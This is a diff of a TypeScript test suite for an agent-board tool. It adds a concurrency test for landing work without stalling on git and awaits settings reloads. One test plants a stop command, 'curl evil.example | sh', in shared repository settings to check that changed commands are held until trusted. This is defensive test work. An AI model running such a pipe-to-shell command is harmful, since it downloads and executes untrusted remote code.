@@ -13,6 +13,7 @@ import { artifact, FakeRuntime, gitRepo, identify, noForge, until } from './test
 import { git, HERE } from './workspaces';
 import { type SkillPlace, Skills } from './skills';
 import { OBEYA_PLUGIN } from './demo';
+import { STALL_MS } from './stalls';
 
 let dir: string;
 const dirs: string[] = [];
@@ -432,6 +433,60 @@ describe('where the settings do not say how work lands', () => {
   });
 });
 
+describe('many landings and agent starts at once', () => {
+  test("the server waits for git in none of them, however slow git is: no stall", async () => {
+    fresh();
+    const shop = gitRepo(join(dir, 'shop'), { 'README.md': 'Shop\n', '.obeya/settings.json': '{ "land": "main" }\n', '.claude/settings.json': '{}\n' });
+    identify(shop);
+    const workers = new FakeRuntime();
+    canvas.shutdown();
+    canvas = new CanvasRuntime({ repos: [{ path: shop }] }, { store: new Store(':memory:'), home: dir, runtime, workerRuntime: workers, forge: noForge });
+    const w = canvas.repos[0]!.workers;
+    const cards = ['A', 'B', 'C', 'D', 'E', 'F'].map((title) => canvas.board.create({ title, x: 0, y: 0 }));
+    const sessionOf = (id: string) => workers.sessions.find((s) => s.spec.cwd === canvas.board.row(id).workspace);
+    // four handed over, each with a commit of its own
+    for (const c of cards.slice(0, 4)) {
+      await w.start(c.id);
+      await until(() => !!sessionOf(c.id));
+      const ws = canvas.board.row(c.id).workspace!;
+      writeFileSync(join(ws, `${c.title}.md`), `${c.title}\n`);
+      git(ws, 'add', '-A');
+      git(ws, 'commit', '--quiet', '-m', c.title);
+      await sessionOf(c.id)!.call('ready_for_review', { summary: c.title, demo: artifact() });
+      sessionOf(c.id)!.emit({ type: 'idle' });
+    }
+    // git as slow as on a busy machine: each process the server waited for would hold it up that long
+    const waited: string[] = [];
+    const spawnSync = Bun.spawnSync;
+    Bun.spawnSync = ((...args: Parameters<typeof Bun.spawnSync>) => {
+      waited.push((args[0] as string[]).join(' '));
+      Bun.sleepSync(150);
+      return spawnSync(...args);
+    }) as typeof Bun.spawnSync;
+    let stall = 0;
+    let last = performance.now();
+    const ticks = setInterval(() => {
+      const now = performance.now();
+      stall = Math.max(stall, now - last);
+      last = now;
+    }, 5);
+    try {
+      // all four approved at once, their work landing on main one after the other, and two cards starting meanwhile
+      await Promise.all([...cards.slice(0, 4).map((c) => w.approve(c.id)), ...cards.slice(4).map((c) => w.start(c.id))]);
+      await until(() => cards.slice(4).every((c) => sessionOf(c.id)));
+    } finally {
+      clearInterval(ticks);
+      Bun.spawnSync = spawnSync;
+    }
+    expect(cards.slice(0, 4).map((c) => item(c.id).state)).toEqual(['live', 'live', 'live', 'live']);
+    expect(git(shop, 'log', '--format=%s', '-4').split('\n').sort()).toEqual(['A', 'B', 'C', 'D']);
+    // the agents that started after main moved know its Claude Code settings wait for the owner
+    expect(cards.slice(4).map((c) => sessionOf(c.id)!.spec.untrusted)).toEqual([true, true]);
+    expect(stall).toBeLessThan(STALL_MS);
+    expect(waited).toEqual([]);
+  });
+});
+
 describe("a repository's settings for this machine", () => {
   test('apply without a restart: landing switched from pull requests to main lands the next approval on main', async () => {
     fresh();
@@ -453,7 +508,7 @@ describe("a repository's settings for this machine", () => {
     workers.last.emit({ type: 'idle' });
 
     settings = { land: 'main' };
-    canvas.settingsChanged();
+    await canvas.settingsChanged();
     expect(canvas.board.snapshot().canvas.repos[0]!.pullRequests).toBeUndefined();
     // the Lesestand is the checkout now, which the landing moves
     expect(canvas.repos[0]!.read.path).toBe(shop);
@@ -479,13 +534,13 @@ describe("a repository's settings for this machine", () => {
     await canvas.repos[0]!.workers.start(card.id);
     expect(git(canvas.board.row(card.id).workspace!, 'log', '-1', '--format=%s').trim()).toBe('Release');
     settings = undefined;
-    canvas.settingsChanged();
+    await canvas.settingsChanged();
     expect(canvas.board.snapshot().canvas.repos[0]!.branch).toBe('main');
   });
 });
 
 describe("a repository's settings for everyone (.obeya/settings.json)", () => {
-  test("a fresh clone runs with them; this machine's go before them; a new version on the default branch applies without a restart", () => {
+  test("a fresh clone runs with them; this machine's go before them; a new version on the default branch applies without a restart", async () => {
     fresh();
     const shop = gitRepo(join(dir, 'shop'), { 'README.md': 'Shop\n', '.obeya/settings.json': '{ "land": "main", "checks": ["bun test"], "planDocs": { "dir": "plans", "exclude": [] } }\n' });
     const clone = join(dir, 'clone');
@@ -502,34 +557,34 @@ describe("a repository's settings for everyone (.obeya/settings.json)", () => {
 
     // a change in the checkout counts once it is committed on the default branch
     writeFileSync(join(clone, '.obeya/settings.json'), '{ "land": "main", "checks": ["bun test", "bun run lint"] }\n');
-    canvas.settingsChanged();
+    await canvas.settingsChanged();
     expect(adapter.checks).toEqual(['bun test']);
     identify(clone);
     git(clone, 'commit', '--quiet', '-am', 'Lint too');
-    canvas.settingsChanged();
+    await canvas.settingsChanged();
     expect([adapter.checks, adapter.planDocs.dir]).toEqual([['bun test', 'bun run lint'], 'docs/plan']);
   });
 
-  test('a change on the default branch to what the problems are read from tells the page to read them again', () => {
+  test('a change on the default branch to what the problems are read from tells the page to read them again', async () => {
     fresh();
     const shop = gitRepo(join(dir, 'shop'), { 'README.md': 'Shop\n', '.obeya/settings.json': '{ "land": "main" }\n', '.obeya/adapter/index.ts': 'export default {};\n' });
     identify(shop);
     canvas.shutdown();
     canvas = new CanvasRuntime({ repos: [{ path: shop }] }, { store: new Store(':memory:'), home: dir, runtime, forge: noForge });
     const rev = () => canvas.board.snapshot().canvas.repos[0]!.configRev;
-    canvas.settingsChanged();
+    await canvas.settingsChanged();
     expect(rev()).toBeUndefined();
     // a field that does not count changes the problems alone, not the settings
     writeFileSync(join(shop, '.obeya/settings.json'), '{ "land": "main", "chekcs": [] }\n');
     git(shop, 'commit', '--quiet', '-am', 'A typo');
-    canvas.settingsChanged();
+    await canvas.settingsChanged();
     expect(rev()).toBe(1);
     // the leftover adapter module goes
     git(shop, 'rm', '--quiet', '-r', '.obeya/adapter');
     git(shop, 'commit', '--quiet', '-m', 'No adapter module');
-    canvas.settingsChanged();
+    await canvas.settingsChanged();
     expect(rev()).toBe(2);
-    canvas.settingsChanged();
+    await canvas.settingsChanged();
     expect(rev()).toBe(2);
   });
 
@@ -556,7 +611,7 @@ describe("a repository's settings for everyone (.obeya/settings.json)", () => {
     expect(canvas.adapterSetupCard('shop').id).toBe(id);
   });
 
-  test('dismissed, the proposal does not come back; still open, it goes once the repository has settings', () => {
+  test('dismissed, the proposal does not come back; still open, it goes once the repository has settings', async () => {
     fresh();
     const shop = gitRepo(join(dir, 'shop'), { 'README.md': 'Shop\n' });
     const web = gitRepo(join(dir, 'web'), { 'README.md': 'Web\n' });
@@ -576,14 +631,14 @@ describe("a repository's settings for everyone (.obeya/settings.json)", () => {
     writeFileSync(join(web, '.obeya/settings.json'), '{ "checks": ["bun test"] }\n');
     git(web, 'add', '.obeya/settings.json');
     git(web, 'commit', '--quiet', '-m', 'Settings');
-    canvas.settingsChanged();
+    await canvas.settingsChanged();
     expect(setup('web')).toBeUndefined();
     canvas.shutdown();
     canvas = start();
     expect(setup('web')).toBeUndefined();
   });
 
-  test("a demo site set in them is shared on once it is complete, without a restart", () => {
+  test("a demo site set in them is shared on once it is complete, without a restart", async () => {
     fresh();
     const shop = gitRepo(join(dir, 'shop'), { 'README.md': 'Shop\n' });
     let settings: RepoSettings | undefined;
@@ -592,10 +647,10 @@ describe("a repository's settings for everyone (.obeya/settings.json)", () => {
     expect(canvas.repos[0]!.site).toBeNull();
     const site = { title: 'Demos', url: 'https://demos.example.dev', deploy: '' };
     settings = { demo: { site } };
-    canvas.settingsChanged();
+    await canvas.settingsChanged();
     expect(canvas.repos[0]!.site).toBeNull();
     settings = { demo: { site: { ...site, deploy: 'git {dir}' } } };
-    canvas.settingsChanged();
+    await canvas.settingsChanged();
     expect(canvas.repos[0]!.site).toEqual({ ...site, deploy: 'git {dir}' });
     expect(canvas.board.canvas.repos[0]!.share).toBe(true);
   });
@@ -622,7 +677,7 @@ describe("a repository's settings for everyone (.obeya/settings.json)", () => {
     const rev = canvas.board.canvas.repos[0]!.configRev ?? 0;
 
     store.trustCommands(shop, commandsOf(readShared(shop)));
-    canvas.settingsChanged();
+    await canvas.settingsChanged();
     expect(r.adapter.app).toEqual({ run: 'bun dev', stop: 'pkill -F .dev.pid' });
     expect(r.site).toEqual(site);
     expect(canvas.board.canvas.repos[0]!.configRev).toBe(rev + 1);
@@ -633,7 +688,7 @@ describe("a repository's settings for everyone (.obeya/settings.json)", () => {
     // changed on the default branch: held again, until trusted anew
     writeFileSync(join(shop, '.obeya/settings.json'), JSON.stringify({ land: 'main', app: { run: 'bun dev', stop: 'curl evil.example | sh' }, demo: { site } }));
     git(shop, 'commit', '--quiet', '-am', 'Another stop');
-    canvas.settingsChanged();
+    await canvas.settingsChanged();
     expect(r.adapter.app).toEqual({ run: 'bun dev' });
     expect(r.site).toEqual(site);
 
@@ -642,7 +697,10 @@ describe("a repository's settings for everyone (.obeya/settings.json)", () => {
     git(shop, 'add', '-A');
     git(shop, 'commit', '--quiet', '-m', 'A skill');
     const third = canvas.board.create({ title: 'Dritte', x: 0, y: 0 });
+    const started = runtime.sessions.length;
     await r.workers.start(third.id);
+    // its agent starts once git has read the default branch, which moved
+    await until(() => runtime.sessions.length > started);
     expect(runtime.last.spec.untrusted).toBe(true);
   });
 
@@ -652,7 +710,7 @@ describe("a repository's settings for everyone (.obeya/settings.json)", () => {
     writeFileSync(join(api, '.claude/settings.json'), '{ "hooks": {} }\n');
     git(api, 'add', '-A');
     git(api, 'commit', '--quiet', '-m', 'Claude settings');
-    canvas.settingsChanged();
+    await canvas.settingsChanged();
     const home = canvas.board.create({ title: 'Home', x: 0, y: 0 });
     const other = canvas.board.create({ title: 'Andere', x: 0, y: 0, repo: 'api' });
     await canvas.repoOf(home.id).workers.start(home.id);
@@ -675,12 +733,12 @@ describe("a repository's settings for everyone (.obeya/settings.json)", () => {
     session.emit({ type: 'session', id: 'sess-a' });
     writeFileSync(join(shop, '.obeya/settings.json'), '{ "land": "main", "checks": ["bun test"] }\n');
     git(shop, 'commit', '--quiet', '-am', 'Checks');
-    canvas.settingsChanged();
+    await canvas.settingsChanged();
     expect(canvas.pendingRestart()).toBeNull();
     const before = canvas.repos[0]!;
     writeFileSync(join(shop, '.obeya/settings.json'), '{ "land": "main", "workspaces": "clones" }\n');
     git(shop, 'commit', '--quiet', '-am', 'Clones');
-    canvas.settingsChanged();
+    await canvas.settingsChanged();
     // the worker at work hears of it and pauses; the restart waits for it
     expect(canvas.pendingRestart()).toMatchObject({ reason: 'repository', cards: [card.id], repos: ['shop'] });
     expect(session.inbox.at(-1)).toContain("restart this repository's agents");
